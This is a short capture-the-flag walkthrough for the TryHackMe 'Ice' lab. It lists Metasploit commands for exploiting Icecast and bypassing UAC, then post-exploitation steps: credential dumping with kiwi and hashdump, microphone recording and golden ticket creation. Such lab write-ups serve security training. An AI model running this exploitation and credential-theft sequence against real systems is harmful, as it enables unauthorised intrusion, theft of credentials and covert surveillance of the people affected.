# Ice

**Room Link:** [https://tryhackme.com/room/ice](https://tryhackme.com/room/ice)



## Recon

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

## Gain Access

**Kali**

```
msfconsole
```

**Metasploit**

```
search icecast
use 0
set RHOSTS $VICTIM
run
```

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

## Escalate



<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
run post/multi/recon/local_exploit_suggester
background
```

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

**Metasploit**

```
use exploit/windows/local/bypassuac_eventvwr
set SESSIONS 1
set LHOST $KALI
run
```

We are still user dark but have a lot of privilege's now

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

## Looting

**Meterpreter**

```
ps
```

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
ps
migrate -N spoolsv.exe
```

**Meterpreter**

```
load kiwi
creds_all
```

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
hashdump
```

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

**Meterpreter**

```
screenshare
record_mic
golden_ticket_create
```





















